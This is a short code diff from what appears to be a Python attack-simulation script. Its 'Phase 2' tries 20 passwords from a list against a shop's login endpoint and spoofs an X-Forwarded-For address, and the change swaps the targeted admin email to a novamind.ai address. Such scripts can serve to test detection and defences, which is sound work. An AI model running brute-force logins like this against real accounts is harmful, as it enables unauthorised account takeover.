@@ -43,7 +43,7 @@ def run() -> dict:
     # Phase 2: Brute force — single user, many passwords
     from rich.console import Console
     Console().print("\n[yellow]Phase 2: Brute force — admin account, 20 password attempts[/yellow]")
-    target = "admin@acmecorp.com"
+    target = "admin@novamind.ai"
     for password in PASSWORDS[:20]:
         headers = random_headers({"X-Forwarded-For": "185.220.101.45"})
         url = f"{SHOP_URL}/login"
